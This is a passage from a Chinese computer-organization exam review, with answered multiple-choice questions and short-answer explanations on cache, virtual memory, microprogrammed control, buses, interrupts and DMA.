C.1.00010    D.0.01010<br>(38)若浮点数用补码表示，则判断运算结果是否为规格化数的方法是（C）。<br>    A 阶符与数符相同为规格化数；<br>    B 阶符与数符相异为规格化数；<br>    C 数符与尾数小数点后第一位数字相异为规格化数。<br>(39)周期挪用方式常用于(  D  )方式的输入/输出中。<br>     A. 中断      B. 程序传送  C. 通道  D. DMA<br>(40)微型机系统中，主机和高速硬盘进行数据交换一般采用( C )方式。<br>     A. 程序查询      B．程序中断         C．DMA<br>(41)  I/O编址方式通常可分统一编址和不统一编址， ( B ) 。<br>     A. 统一编址就是将I/O地址看作是存储器地址的一部分，可用专门的I/O指令对设备进行访问<br>     B. 不统一编址是指I/O地址和存储器地址是分开的，所以对I/O访问必须有专门的I/O指令<br>     C. 统一编址是指I/O地址和存储器地址是分开的，所以可用访存指令实现CPU对设备的访问<br>(42) I/O与主机交换信息的方式中，中断方式的特点是(  B  ) 。<br>     A．CPU与设备串行工作，传送与主程序串行工作<br>     B．CPU与设备并行工作，传送与主程序串行工作<br>     C．CPU与设备并行工作，传送与主程序并行工作<br>(43)下列叙述中正确的是(  C  )。<br>     A. 程序中断方式和DMA方式中实现数据传送都需中断请求<br>     B. 程序中断方式中有中断请求，DMA方式中没有中断请求<br>     C. 程序中断方式和DMA方式中都有中断请求，但目的不同<br>(44)硬盘适合于用(  A  )方式实现输入输出操作<br>     A．DMA       B．中断         C．程序查询<br>(45) CPU响应中断的时间是(  A  ) 。<br>     A．一条指令执行结束     B．外设提出中断      C．取指周期结束<br>(46)主机与I/O设备传送数据时，采用(  C  ) ，CPU的效率最高。<br>     A. 程序查询方式     B．中断方式         C．DMA方式<br>(47) 至今为止，计算机中的所有信息仍以二进制方式表示，是因为(  C   )。<br>     A. 节约元件；              B. 运算速度快；<br>    C. 物理器件的性能决定 ；   D 信息处理方便；<br>(48) 计算机的存储器采用分级方式是为了(  D  )。<br>     A. 减少主机箱的体积    B. 保存大量数据方便<br>     C. 操作方便            D. 解决CPU和内存之间的速度匹配问题<br>(49) 主存储器是计算机系统的记忆设备，它主要用来(  C   ).<br>   A. 存放数据    B. 存放程序   C. 存放数据和程序   D. 存放微程序<br>(50) 寄存器间接寻找方式中，操作数处在( D ).<br>    A. 通用寄存器    B. 程序计数器  C. 堆栈   D. 主存单元<br>(51) 指令系统采用不同寻址方式的目的是(  B   ).<br>    A. 实现存贮程序和程序控制；<br>    B. 缩短指令长度，扩大寻址空间，提高编程灵活性；。<br>    C. 可直接访问外存；<br>    D. 提供扩展操作码的可能并降低指令译码的难度；<br>(52) 计算机中的ALU属于(  A  )部件。<br>     A. 运算器   B.控制器    C. 寄存器   D.译码器<br>(53) 在CPU中跟踪指令后继地址的寄存器是（ B ）。<br>     A. 主存地址寄存器  B.程序计数器  C.指令寄存器  D.状态条件寄存器<br>(54) 系统总线地址的功能是（ D  ）。<br>     A. 选择主存单元地址；   B.选择进行信息传输的设备；<br>     C. 选择外存地址；       D. 指定主存和I / O设备接口电路的地址；<br>(55) 在定点二进制运算器中，减法运算一般通过(  D  )来实现。<br>    A.  原码运算的二进制减法器  B.  补码运算的二进制减法器<br>    C.  原码运算的十进制加法器  D.  补码运算的二进制加法器<br>(56) 主存贮器和CPU之间增加cache的目的是(  A  )。<br>     A.解决CPU和主存之间的速度匹配问题<br>     B.扩大主存贮器容量<br>     C.扩大CPU中通用寄存器的数量<br>     D. 既扩大主存贮器容量，又扩大CPU中通用寄存器的数量<br>(57) 以硬连线方式构成的控制器也称(  A  )。<br>     A.组合逻辑性控制器       B.微程序控制器<br>     C.存储逻辑性控制器       D.运算器<br>(58) 在虚拟存贮器中，当程序正在执行时，由(  D  )完成地址映射。<br>     A. 程序员    B. 编译器    C.装入程序    D. 操作系统<br>(59) 在单级中断系统中，CPU一旦响应中断，则立即关闭(  C    )标志，以防本次中断服务结束前同级的其他中断源产生另一次中断进行干扰。<br>     A．中断允许    B.  中断请求     C.  中断屏蔽    D. 中断保护<br>(60) 虚拟存贮器常用地址映象方式是(  B  )。<br>     A. 组相联    B. 全相联     C. 直接映象     D. 相联<br>(61) 在计算机中能直接被接受的语言为(  A  )。<br>     A.机器语言    B.汇编语言   C.高级语言     D.数据库语言<br>(62) 垂直型微指令的特点是(  C  )。<br>    A．微指令格式垂直表示；   B．控制信号经过编码产生；<br>    C．采用微操作码；         D．采用微指令码。<br>(63) 指令寄存器的位数取决于（ B ）。<br>     A．存储器的容量；B．指令字长；C．机器字长；D．存储字长<br>(64) 总线从设备是( C )。<br>     A.掌握总线控制权的设备          B.申请作为从设备的设备<br>     C.被主设备访问的设备            D.总线裁决部件。<br>(65)在计算机中，存放微指令的控制存储器隶属于（ B ）。<br>     A．高速缓存     B．CPU     C．内存储器     D．外存。<br>(66) 设机器数字长为32位，一个容量为16MB的存储器，CPU按半字寻址，其寻址范围是（ B ）。<br>      A．224        B．223        C．222     D．221。<br>(67) 在中断接口电路中，向量地址可通过（ B ） 送至CPU。<br>     A．地址线     B．数据线     C．控制线     D．状态线。<br>(68) 指令寄存器的位数取决于（ B ）。<br>     A．存储器的容量；B．指令字长；C．机器字长；D．存储字长<br>(69) 总线的异步通信方式（ A ）。<br>    A．不采用时钟信号，只采用握手信号；<br>    B．既采用时钟信号，又采用握手信号；<br>    C．既不采用时钟信号，又不采用握手信号；<br>    D．采用时钟信号，不采用握手信号。<br>(70) 在磁盘存储器中，查找时间是（ A ）。<br>    A．使磁头移动到要找的柱面上所需的时间；<br>    B．在磁道上找到要找的扇区所需的时间；<br>    C．在扇区中找到要找的数据所需的时间。<br>    D．以上都不对。<br>(71) 在控制器的控制信号中，相容的信号是（ C ）的信号。<br>    A．可以相互替代；     B．可以相继出现；<br>    C．可以同时出现；     D．不可以同时出现。<br>(72) 在控制器的控制方式中，机器周期内的时钟周期个数可以不相同，这属于（ A ）。<br>   A．同步控制；B．异步控制；C．联合控制；D．局部控制。<br>(73) 堆栈寻址方式中，设A为累加器，SP为堆栈指示器，MSP为SP指示的栈顶单元，如果进栈操作的动作顺序是(SP) – 1 → SP，(A) → MSP，那么出栈操作的动作顺序应为 (  A  )。<br>    A．(MSP) → A，(SP) + 1 → SP；  B．(SP) + l → SP，(MSP) → A；<br>    C．(SP) – 1 → SP，(MSP) → A；  D．以上都不对。<br>(74) 通道程序是由(  B  )组成。<br>    A．I/O指令；       B．通道控制字（或称通道指令）；<br>    C．通道状态字；    D．微程序。<br>(75) 浮点数的表示范围和精度取决于 (  C  )。<br>    A．阶码的位数和尾数的机器数形式；B．阶码的机器数形式和尾数的位数；<br>    C．阶码的位数和尾数的位数；  D．阶码的机器数形式和尾数的机器数形式。<br>(76) 以下叙述中(  B  )是错误的。<br>    A．取指令操作是控制器固有的功能，不需要在操作码控制下完成；<br>    B．所有指令的取指令操作都是相同的；<br>    C．在指令长度相同的情况下，所有指令的取指操作都是相同的；<br>    D．一条指令包含取指、分析、执行三个阶段。<br>(77) CPU通过(  B  )启动通道。<br>    A．执行通道命令；B．执行I/O指令；C．发出中断请求；D．程序查询。<br>(78) 总线中地址线的作用是(  C  ) 。<br>    A．只用于选择存储器单元；       B．由设备向主机提供地址；<br>    C．用于选择指定存储器单元和I/O设备接口电路的地址；<br>    D．即传送地址又传送数据。<br>(79) DMA方式的接口电路中有程序中断部件，其作用是(  C  ) 。<br>    A．实现数据传送；          B．向CPU提出总线使用权；<br>    C．向CPU提出传输结束；   D．发中断请求。<br>(80) 存放要执行指令的寄存器是(  D  ) 。<br>    A．MAR；   B．PC；    C．MDR；    D．IR。<br>(81) 在CPU的寄存器中，(  B  )对用户是完全透明的。<br>    A．程序计数器；  B．指令寄存器；  C．状态寄存器；D．通用寄存器。<br>(82) 一个16K×32位的存储器，其地址线和数据线的总和是 (  B  ) 。<br>    A．48；    B．46；    C．36；   D．32．<br>(83) 在浮点机中，判断原码规格化形式的原则是 (  B ) 。<br>    A．尾数的符号位与第一数位不同；B．尾数的第一数位为1，数符任意；<br>    C．尾数的符号位与第一数位相同；D．阶符与数符不同。<br>(84) 虚拟段页式存储管理方案的特性为( D ) 。<br>    A.空间浪费大、存储共享不易、存储保护容易、不能动态连接。<br>    B.空间浪费小、存储共享容易、存储保护不易、不能动态连接。<br>    C.空间浪费大、存储共享不易、存储保护容易、能动态连接。<br>    D.空间浪费小、存储共享容易、存储保护容易、能动态连接。<br>(85) 下述有关存储器的描述中，正确的是(  B  ) 。<br>    A. 多级存储体系由Cache、主存和虚拟存储器构成。<br>    B. 存储保护的目的是：在多用户环境中，既要防止一个用户程序出错而破坏系统软件或其它用户程序，又要防止用户访问不是分配给他的主存区，以达到数据安全与保密的要求。<br>    C. 在虚拟存储器中，外存和主存以相同的方式工作，因此允许程序员用比主存空间大得多的外存空间编程。<br>    D. Cache和虚拟存储器这两种存储器管理策略只有Cache利用了程序的局部性原理。<br>(86) 下列说法正确的是(  D  ) 。<br>    A.多体交叉存储器主要解决扩充容量问题<br>    B.cache 与主存统一编址，cache 的地址空间是主存空间的一部分<br>    C.主存都是由易失性的随机读写存储器构成<br>    D.cache 的功能全部由硬件完成<br>(87) 下列陈述中正确的是 ( D ) 。<br>    A、在DMA周期内，CPU不能执行程序;<br>    B、中断发生时，CPU首先执行入栈指令将程序计数器内容保护起来;<br>    C、DMA传送方式中，DMA控制器每传送一个数据就窃取一个指令周期;<br>    D、输入输出操作的最终目的是要实现CPU与外设之间的数据传输.<br>(88) 常用的虚拟存贮系统由(  A  )两级存贮器组成，其中辅存是大容量的磁表面存贮器。<br>    A.主存-辅存     B.快存-主存    C.快存-辅存     D.通用寄存器-主存<br>(89) 为确定下一条微指令的地址，通常采用断定方式，其基本思想是( C )。<br>    A.用程序计数器PC来产生后继微指令地址<br>    B.用微程序计数器μPC来产生后继微指令地址<br>    C.通过微指令顺序控制字段由设计者指定或由设计者指定的判别字段控制产生后继微指令地址<br>    D.通过指令中指定一个专门字段来控制产生后继微指令地址<br>(90) 下面尾数（1位符号位）的表示中，不是规格化的尾数的是( D )。<br>    A、010011101（原码）         B、110011110（原码）<br>    C、010111111 （补码）        D、110111001（补码）<br>(91) 动态RAM比起静态RAM的主要优点是(  C  )。<br>     A.　速度快    B. 数据不易丢失    C. 存储密度高        D. 控制简单<br>(92) 微程序控制器中，“存储逻辑”是指将控制逻辑存储在    (  A  )    中。<br>     A. ROM        B. RAM        C. PLA        D. Cache<br>(93) 下列哪种指令不属于程序控制指令是(  C  )。<br>    A. 无条件转移指令                    B. 条件转移指令<br>    C. 中断指令                            D. 循环指令<br>(94) 指令系统中采用不同寻址方式的目的主要是(  B  )。<br>    A. 实现存储程序的程序控制<br>    B. 缩短指令长度，扩大寻址空间，提高编程灵活性<br>    C. 可以直接访问外存<br>    D. 提供扩展操作码的可能并降低指令译码难度<br>(95) 一个节拍信号的宽度是指(  C  )<br>     A．指令周期；  B．机器周期； C．时钟周期； D．存储周期。<br>(96)某计算机字长是32位，存储器容量是256KB，按字编址，它的寻址范围是（ B ）。<br>        A.128K    B.64K      C. 64KB<br>(97)．存储单元是指(  B  )。<br>    A．存放一个字节的所有存储元集合  B．存放一个存储字的所有存储元集合<br>    C．存放一个二进制信息位的存储元集合  D．存放一条指令的存储元集合。<br>(98)．总线复用方式可以(  C  )。<br>    A．提高总线的传输带宽        B．增加总线的功能<br>    C．减少总线中信号线的数量   D．提高CUP利用率<br>(99)．在单总线结构的CPU中，连接在总线上的多个部件(  B  )。<br>    A．某一时刻只有一个可以向总线发送数据，并且只有一个可以从总线接收数据；<br>    B．某一时刻只有一个可以向总线发送数据，但可以有多个同时从总线接收数据；<br>    C．可以有多个同时向总线发送数据，并且可以有多个同时从总线接收数据；<br>    D．可以有多个同时向总线发送数据，但可以有一个同时从总线接收数据。<br>(100)系统总线中的数据线、地址线和控制线是根据（  C ）来划分的。<br>    A. 总线所处的位置    B. 总线的传输方向   C. 总线的传输内容<br>(101) 若某存储器容量为32K×16位，则（ C ）。<br>    A．地址线为16根，数据线为32根<br>    B. 地址线为32根，数据线为16根<br>    C. 地址线为15根，数据线为16根<br>(102) 程序员编程所用的地址为（ A ）。<br>      A.逻辑地址       B.物理地址      C. 真实地址<br>(103) 在下列因素中，与cache命中率无关的是（ C ）。<br>       A．cache块的大小   B. cache的容量    C. 主存的存取时间<br>(104) 通道对CPU的请求形式是（ B ）.<br>      A. 自陷   B. 中断  C. 通道命令  D. I/O指令<br>(105)  DMA接口（ B ）.<br>    A. 可用于主存与主存之间的数据交换<br>    B. 内有中断机制   C. 内有中断机制，可以处理异常情况<br>(106)  在定点补码运算中，若采用双符号位，当（  B ）时表示结果溢出.<br>    A. 双符号位相同          B. 双符号位不同<br>    C. 两个正数相加         D. 两个负数相加<br>(107) 下列说法是中（ D ）是错误的.<br>      A. 符号相同的两个数相减是不会产生溢出的<br>    B. 符号不同的两个数相加是不会产生溢出的<br>    C. 逻辑运算是没有进位或借位的运算<br>    D. 浮点乘除运算需进行对阶操作<br>(108) 采用规格化的浮点数是为了（ D ）.<br>      A. 增加数据的表数范围    B. 方便浮点运算<br>    C. 防止运算时数据溢出    D. 增加数据的表示精度<br>(109) 浮点数舍入处理的方法除了0舍1入外，还有（ B ）法.<br>      A. 末位恒置“0”    B. 末位恒置“1”<br>    C. 末位加1          D. 末位减1<br>(110) 当定点运算发生溢出时，应（ C ）.<br>      A. 向左规格化   B. 向右规格化  C. 发出出错信息  D. 舍入处理<br>(111) 中断向量可提供（ C ）<br>    A. 被选中设备的地址           B. 传送数据的起始地址<br>    C. 中断服务程序入口地址       D. 主程序的断点地址<br>(112) 某机器有四级中断向量，优先级从高到低1→2→3→4,若将优先级顺序修改，改后1级中断的屏蔽字为1011,2级中断的屏蔽字为1111,3级中断的屏蔽字为0011,4级中断的屏蔽字为0001，则修改后的优先顺序从高到低为（ C ）<br>    A. 3→2→1→4                    B. 1→3→4→2<br>    C. 2→1→3→4                    D. 4→2→1→3<br>(113) 设寄存器内容为10000000，若它等于0，则为（ D ）<br>    A. 原码   B. 补码  C. 反码  D. 移码<br>(114) 在浮点机器中，判断原码规格化形式的原则是（ A ）<br>    A. 尾数第一位数为1，数符号任意   B. 尾数的符号位与第一位相同<br>    C. 尾数的符号位与第一位不同      D. 阶符和数符不同<br>(115) 计算机中表示地址时，采用（ D ）<br>    A. 原码   B. 补码    C. 反码    D. 无符号数<br>(116) 采用指令cache与数据cache 分离的主要目的是（ D ）<br>    A. 降低 cache 缺失损失    B. 提高 cache 命中率<br>    C. 降低 CPU平均访存时间   D. 减少指令流水线资源冲突<br>(117) 某容量为256M的存储器有若干4M ×8位的DRAM 芯片构成，该DRAM芯片的地址引脚和数据引脚总数是（ D ）<br>    A.22   B.30    C.36    D.19<br>(118) 某存储器容量为64KB,按字节编址，地址4000H~5FFFH为ROM区，其余为RAM区 ，若采用8K ×4位的SRAM芯片进行设计，则需要改芯片的数量为（ C ）<br>    A.7   B.8    C.14    D.16<br>(119) 某计算机采用微程序控制器，共有32条指令，公共取指令微程序包含2条微指令，各指令对应的微程序平均由4条微指令组成，采用断定发确定下条微指令地址，则微指令中下地址字段位数至少是（ C ）<br>    A.5    B.6    C.8    D.9<br>(120) 某计算机主存按字节编址，由4个64M ×8位的DRAM芯片采用交叉编址方式构成，并与宽度为32位的存储总线相连，主存每次最多读写32位数据。若double 型变量x 的主存地址为805 001BH,则读取 x 需要的存储周期数是（C）<br>    A.1   B.2    C.3    D.4</p><p><strong>同学，看了这么多内容，一定累了吧！歇一歇，一会儿再肝！</strong></p><h3 id="2021年新增单选题"><a href="#2021年新增单选题" class="headerlink" title="2021年新增单选题"></a>2021年新增单选题</h3><p>(116) 采用指令cache与数据cache 分离的主要目的是（ D ）<br>    A. 降低 cache 缺失损失    B. 提高 cache 命中率<br>    C. 降低 CPU平均访存时间   D. 减少指令流水线资源冲突<br>(117) 某容量为256M的存储器有若干4M ×8位的DRAM 芯片构成，该DRAM芯片的地址引脚和数据引脚总数是（ D ）<br>    A.22   B.30    C.36    D.19<br>(118) 某存储器容量为64KB,按字节编址，地址4000H~5FFFH为ROM区，其余为RAM区 ，若采用8K ×4位的SRAM芯片进行设计，则需要改芯片的数量为（ C ）<br>    A.7   B.8    C.14    D.16<br>(119) 某计算机采用微程序控制器，共有32条指令，公共取指令微程序包含2条微指令，各指令对应的微程序平均由4条微指令组成，采用断定发确定下条微指令地址，则微指令中下地址字段位数至少是（ C ）<br>    A.5    B.6    C.8    D.9<br>(120) 某计算机主存按字节编址，由4个64M ×8位的DRAM芯片采用交叉编址方式构成，并与宽度为32位的存储总线相连，主存每次最多读写32位数据。若double 型变量x 的主存地址为805 001BH,则读取 x 需要的存储周期数是（C）<br>    A.1   B.2    C.3    D.4</p><h3 id="二．简答题"><a href="#二．简答题" class="headerlink" title="二．简答题"></a>二．简答题</h3><p><strong>1.冯•诺依曼计算机体系的基本思想是什么？按此思想设计的计算机硬件系统由哪些部分组成？</strong><br>答：冯•诺依曼计算机体系的基本思想：①采用二进制形式表示计算机中的数据和指令② 程序和数据放在同一存储器中，指令和数据一样可以送到运算器中运算。存储程序并按地址顺序执行.<br>按此思想设计的计算机硬件系统:由运算器、存储器、控制器、输入设备和输出设备五大基本部件。<br><strong>2.计算机系统有哪些层次结构？</strong><br>答：从计算机系统的层次结构来看，它通常可有五个以上的不同级组成，每一个上都能进行程序设计。由下至上可排序为：第一级微程序机器级，微指令由硬件直接执行；第二级传统机器级，用微程序解释机器指令；第三级操作系统级，一般用机器语言程序解释作业控制语句；第四级汇编语言机器级，这一级由汇编程序支持合执行；第五级高级语言机器级，采用高级语言，由各种高级语言编译程序支持合执行，还可以有第六级应用语言机器级，采用各种面向问题的应用语言。<br><strong>3. 存储器的层次结构主要体现在什么地方？为什么要分这些层次？计算机如何管理这些层次？</strong><br>答：存储器的层次结构主要体现在Cache—主存和主存—辅存这两个存储层次上。<br>    Cache—主存层次在存储系统中主要对CPU访存起加速作用，即从整体运行的效果分析，CPU访存速度加快，接近于Cache的速度，而寻址空间和位价却接近于主存。<br> 主存—辅存层次在存储系统中主要起扩容作用，即从程序员的角度看，他所使用的存储器其容量和位价接近于辅存，而速度接近于主存。<br>    综合上述两个存储层次的作用，从整个存储系统来看，就达到了速度快、容量大、位价低的优化效果。<br>主存与CACHE之间的信息调度功能全部由硬件自动完成。<br>而主存—辅存层次的调度目前广泛采用虚拟存储技术实现，即将主存与辅存的一部份通过软硬结合的技术组成虚拟存储器，程序员可使用这个比主存实际空间（物理地址空间）大得多的虚拟地址空间（逻辑地址空间）编程，当程序运行时，再由软、硬件自动配合完成虚拟地址空间与主存实际物理空间的转换。<br>这两个层次上的调度或转换操作对于程序员来说都是透明的。<br><strong>4. 为什么说现代计算机中主存储器处于全机中心地位?</strong><br>答：现代计算机中，存储器处于全机的中心地位，原因：<br>① 存储处在运行中的指令和数据；<br>②I/O设备数量增多，数据传送速度加快，因此采用了DMA技术和通道技术，在存储器和I/O设备间直接传送数据；<br>③共享存储器的多处理机的出现，利用存储器存放共享数据，并实现处理机之间的通信，更加强了存储器作为全机中心的地位。<br><strong>5.程序访问的局部性原理中的时间局部性和空间局部性？</strong><br>答：时间局部性是指程序在最近的未来要用到的信息很可能是现在正在使用的信息。<br>    空间局部性是指程序在最近的未来要用到的信息与现在正在使用的信息很可能在程序空间上是相邻或相近的。</p><p><strong>6. 什么是高速缓冲存储器？ 它与主存是什么关系？ 其基本工作过程如何？</strong><br>答：高速缓冲存储器位于主存和CPU 之间，用来存放当前正在执行的程序段和数据中的活跃部分，使CPU 的访存操作大多数针对Cache 进行，从而使程序的执行速度大大提高。<br>高速缓冲存储器的存取速度接近于CPU 的速度，但是容量较小，它保存的信息只是主存中最急需处理的若干块的副本。<br>当CPU 发出读请求时，如果Cache 命中，就直接对Cache 进行读操作，与主存无关；如果Cache 不命中，则仍需访问主存，并把该块信息一次从主存调入Cache 内。若此时Cache 已满，则须根据某种替换算法，用这个块替换掉Cache 中原来的某块信息。<br><strong>7. 为什么每出现新一代存储器芯片，容量至少提高到4倍？</strong><br>答：行地址和列地址分时复用, 每出现新一代存储器芯片，至少要增加一根地址线每加一根地址线，则行地址和列地址各增加一位，所以行数和列数各增加一倍。因而容量至少提高到4倍。<br><strong>8.cache地址映象方法有哪几种？它们各有什么优缺点？</strong><br>答：(1) 全相联映象。实现查找的机制复杂，代价高，速度慢。Cache空间的利用率较高，块冲突概率较低，因而Cache的失效率也低。<br>（2）直接映象。实现查找的机制简单，速度快。Cache空间的利用率较低，块冲突概率较高，因而Cache的失效率也高。<br>（3）组相联映象。组相联是直接映象和全相联的一种折衷。<br><strong>9. 段式虚拟存储器对程序员是否透明？请说明原因。</strong><br>答：虚拟管理是由软件(操作系统)和硬件共同完成，由于软件的介入，虚存对实现存储管理系统程序不透明。而段是按照程序的自然分界划分的长度可以动态改变的区域。通常，程序员把子程序、操作数和常数等不同类型的数据划分到不同的段中，并且每个程序可以有多个相同类型的段。<br>由于分段是由程序员完成的，所以段式虚拟存储器对程序员而言不是透明的，但虚存到实存的地址映射是由系统软件辅助完成的，故对应用程序而言，段是虚拟存储器是“半透明”的。<br><strong>10. 在一个进程的执行过程中，是否其所有页面都必须处在主存中？</strong><br>答：在虚拟存储管理系统中，程序并不是一次整体装入内存才运行，所以不是所有页面都必须处在主存中，而是根据程序的局部性，有的页面在主存，有的页面在辅存。<br><strong>11. 在虚存实现过程中，有些页面会在内存与外存之间被频繁地换入换出，使系统效率急剧下降。这种现象称为颠簸（或叫抖动）。请解释产生颠簸的原因，并说明防止颠簸的办法？</strong><br>答：产生颠簸的原因主要有：①分配的页面数太少②替换策略不佳。<br>防止颠簸的办法：适当增加分配给用户程序的页面数，选取LRU或更好的替换策略。<br><strong>12. 为什么在页式虚拟存储器地址变换时可以用物理页号与页内偏移量直接拼接成物理地址，而在段式虚拟存储器地址变换时必须用段起址与段内偏移量相加才能得到物理地址？</strong><br>答：由于物理页与虚拟页的页面大小相同，且为2的整数次幂，所以页式虚拟存储器地址变换时可以用物理页号与页内偏移量直接拼接成物理地址。<br>而段式虚拟存储器的各段大小不同，且段起始地址任意，所以必须用段起址与段内偏移量相加才能得到物理地址。<br><strong>13. 什么是微命令和微操作？ 什么是微指令？ 微程序和机器指令有何关系？ 微程序和程序之间有何关系？</strong><br>答：微命令是控制计算机各部件完成某个基本微操作的命令。微操作是指计算机中最基本的、不可再分解的操作。微命令和微操作是一一对应的，微命令是微操作的控制信号，微操作是微命令的操作过程。<br>微指令是若干个微命令的集合。微程序是机器指令的实时解释器，每一条机器指令都对应一个微程序。<br>微程序和程序是两个不同的概念。微程序是由微指令组成的，用于描述机器指令，实际上是机器指令的实时解释器，微程序是由计算机的设计者事先编制好并存放在控制存储器中的，一般不提供给用户；程序是由机器指令组成的，由程序员事先编制好并存放在主存储器中。<br><strong>14. 试比较水平型微指令与垂直型微指令</strong><br>答：水平型微指令是面向处理机内部控制逻辑的描述，而垂直型微指令则是面向算法的描述，两者各有其优缺点。<br>水平型微指令并行操作能力强，效率高，灵活性强，垂直型微指令差；<br>水平型微指令执行一条指令的时间短；垂直型微指令执行时间长；<br>由水平型微指令解释指令的微程序，具有微指令字比较长，但程序短的特点。垂直型微指令则相反，微指令比较短而微程序长；<br>水平型微指令用户难以掌握。而垂直型微指令与指令比较相似，相对来说较易掌握。<br>实际使用中，常常兼顾两者的优点，设计出一种混合型微指令，采用不太长的字长又具有一定的并行控制能力。</p><p><strong>15.能否说水平型微指令就是直接编码的微指令，为什么？</strong><br>答：不能说水平型微指令就是直接编码的微指令，因为水平型微指令是指一次能定义并执行多个并行操作的微命令：从编码方式看，直接编码，字段直接编码，字段间接编码以及直接和字段混合编码都属水平型微指令，只要在一条微命令中定义并执行多个并行操作，即可称为水平型微指令，与编码方式无关，但直接编码速度最快，字段编码要经过译码，故速度受影响。</p><p><strong>16. 能不能说机器的主频越快，机器的速度就越快，为什么？</strong><br>答：不能说机器的主频越快，机器的速度就越快。因为机器的速度不仅与主频有关，还与数据通路结构、时序分配方案、ALU运算能力、指令功能强弱等多种因素有关，要看综合效果。</p><p><strong>17.什么是指令周期？指令周期是否有一个固定值？为什么？</strong><br>答：指令周期是CPU每取出并执行一条指令所需的全部时间，也即CPU完成一条指令的时间。由于各种指令操作的功能不同，因此各种指令的指令周期是不同的，指令周期的长短主要和指令在执行阶段的访问主存的次数和执行阶段所需要完成的操作有关。<br><strong>18.什么是指令周期、机器周期和时钟周期？三者有何关系？</strong><br>答：指令周期：CPU取出并执行一条指令所需的全部时间，即完成一条指令的时间。<br>机器周期：所有指令执行过程中的一个基准时间，取决于指令的功能及其间的速度。<br>时钟周期：用时钟信号来控制产生每一个微操作命令。一个机器周期内包含了若干个时钟周期，又称节拍或状态。在每个节拍内机器可完成一个或几个同时执行的操作。<br><strong>19. 请说出取指微指令的几个主要操作步骤？</strong><br>答：① 指令地址送地址总线（PC → AB） ；② 发访存控制命令，从存储器取指令送数据总线（W/R#=0; M/IO#=1）；③ 指令送指令寄存器（DB →IR）；④ 程序计数器+1（PC+1，ADS）。<br><strong>20. 试比较同步通信和异步通信。</strong><br>答：同步通信——由统一时钟控制的通信，控制方式简单，灵活性差，当系统中各部件工作速度差异较大时，总线工作效率明显下降。适合于速度差别不大的场合；<br>异步通信——不由统一时钟控制的通信，部件间采用应答方式进行联系，控制方式较同步复杂，灵活性高，当系统中各部件工作速度差异较大时，有利于提高总线工作效率。<br> <strong>21. 为什么需要I/O接口？I/O接口的基本功能?</strong><br>答：需要I/O接口主要基于以下原因:<br>(1)各种外设的操作方法不同，由CPU统一控制不切合实际。<br>(2)外设的数据传输速率比存储器和CPU慢，使得高速总线不能直接与外设相连。<br>(3)外设所使用的数据格式各不一致。<br>I/O接口是连接主机（CPU、主存）和外部设备的桥梁，其基本功能有： (1)控制和定时;(2)CPU通信(3)设备通信;(4)数据缓冲(5)检错<br><strong>22. I/O有哪些编址方式？各有何特点？</strong><br>答：常用的I/O编址方式有两种： I/O与内存统一编址和I/O独立编址；<br>I/O与内存统一编址方式的I/O地址采用与主存单元地址完全一样的格式，I/O设备和主存占用同一个地址空间，CPU可像访问主存一样访问I/O设备，不需要安排专门的I/O指令。<br>I/O独立编址方式时机器为I/O设备专门安排一套完全不同于主存地址格式的地址编码，此时I/O地址与主存地址是两个独立的空间，CPU需要通过专门的I/O指令来访问I/O地址空间。<br><strong>23.试比较三种通道的优缺点及适用场合。</strong><br>答：（1）字节多路通道。一种简单的共享通道，主要为多台低速或中速的外围设备服务。<br>（2）数组多路通道。适于为高速设备服务。<br>（3）选择通道。为多台高速外围设备（如磁盘存储器等）服务的。<br><strong>24. 什么是中断？外部设备如何才能产生中断？</strong><br>答：中断是指：计算机执行现行程序的过程中，出现某些急需处理的异常情况和特殊请求，CPU 暂时中止现行程序，而转去对随机发生的更紧迫的事件进行处理，在处理完毕后，CPU 将自动返回原来的程序继续执行。<br>外部设备（中断源）准备就绪后会主动向CPU 发出中断请求。通常由外设的完成信号将相应的中断请求触发器置成“１”状态，表示该中断源向CPU 提出中断请求。<br><strong>25.说明中断向量地址和入口地址的区别和联系。</strong><br>答：向量地址是硬件电路产生的中断源的内存地址编号,中断入口地址是中断服务程序首址。<br>中断向量地址和入口地址的联系：中断向量地址可理解为中断服务程序入口地址指示器（入口地址的地址），通过它访存可获得中断服务程序入口地址。<br><strong>26.CPU对DMA 请求和中断请求的响应时间是否一样？为什么？</strong><br>答：CPU对DMA请求和中断请求响应时间不一样，因为两种方式的交换速度相差很大，因此CPU 必须以更短的时间间隔查询并响应DMA请求（一个存取周期末）<br><strong>27. DMA和中断的区别?</strong><br>答：⑴中断方式是程序切换,需要保护和恢复现场；而DMA方式除了开始和结尾时,不占用CPU任何资源.<br> ⑵对中断请求的响应只能发生在每条指令执行完毕时,而对DMA请求的响应可以发生在每个机器周期结束时.<br> ⑶中断传送过程需要CPU的干预,而DMA传送过程不需要CPU的干预,故数据传送速率非常高,适合于高速外设的成组传送. DMA 请求的优先级应高于中断请求。<br><strong>28. 常见的数据传送控制方式有哪几种？CPU 响应中断应具备哪些条件？</strong><br>答：常见的数据传送控制方式有:程序控制；中断控制；DMA；I/O通道控制；外围处理机控制。<br>CPU 响应中断应具备的条件：① CPU 接收到中断请求信号；② CPU 允许中断；③ 一条指令执行完毕。<br><strong>29. 什么叫中断隐指令？ 中断隐指令有哪些功能？ 中断隐指令如何实现？</strong><br>答：CPU 响应中断之后，经过某些操作，转去执行中断服务程序。这些操作是由硬件直接实现的，称为中断隐指令。中断隐指令并不是指令系统中的一条真正的指令，它没有操作码，所以中断隐指令是一种不允许、也不可能为用户使用的特殊指令。其所完成的操作主要有：① 保存断点；② 暂不允许中断；③ 引出中断服务程序。<br><strong>30. 试比较程序查询方式、程序中断方式和 DMA方式对CPU工作效率的影响。</strong><br>答：程序查询方式要求CPU时刻查询I/O，直到I/O准备好为止，这种方式CPU工作效率很低。程序中断方式比程序中断方式提高了CPU的工作效率，消除了“踏步”现象。DMS方式中CPU的工作效率是这三种之中最高的一个。CPU启动I/O后，不必查询I/O是否准备好，当I/O准备就绪后，发出DMA请求，此时CPU不直接参与I/O和主存间的信息交换，只是把外部总线的使用权暂时交付DMA，仍然可以完成自身内部的操作，所以不必中断现行程序，只需暂停一个存取周期访存，CPU效率更高。<br><strong>31. (1)计算机中设置Cache作用是？(2)能否将Cache容量扩大取代主存？为什么？</strong><br>答：计算机中设置Cache的作用是解决CPU和主存速度不匹配问题。<br>不能将Cache的容量扩大取代主存，原因是:（1）Cache容量越大成本越高，难以满足人们追求低价格的要求；（2）如果取消主存，当CPU访问Cache失败时，需要将辅存的内容调入Cache再由CPU访问，造成CPU等待时间太长，损失更大。<br><strong>32. 